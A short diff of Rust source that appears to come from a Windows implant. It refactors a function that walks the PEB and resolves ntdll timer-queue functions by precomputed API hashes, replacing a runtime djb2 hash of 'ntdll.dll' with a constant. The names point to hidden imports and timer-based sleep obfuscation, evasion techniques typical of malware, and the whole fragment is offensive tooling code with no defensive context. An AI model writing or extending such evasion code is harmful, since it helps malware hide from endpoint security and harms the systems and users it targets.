@@ -47,9 +47,9 @@ struct SleepCtx {
 /// Returns (create_queue, create_timer, delete_queue_ex) function pointers or None.
 #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
 unsafe fn resolve_rtl_timer_fns() -> Option<(usize, usize, usize)> {
-    use crate::resolve::api_hash::{djb2_hash_lower, peb_get_module_base, resolve_by_hash};
+    use crate::resolve::api_hash::{peb_get_module_base, resolve_by_hash};
     use crate::resolve::api_hash::h;
-    let ntdll = peb_get_module_base(djb2_hash_lower(b"ntdll.dll"));
+    let ntdll = peb_get_module_base(h::DLL_NTDLL);
     if ntdll.is_null() { return None; }
     let ctq = resolve_by_hash(ntdll, h::RTL_CRE_TQ)? as usize;
     let ct  = resolve_by_hash(ntdll, h::RTL_CRE_T)? as usize;
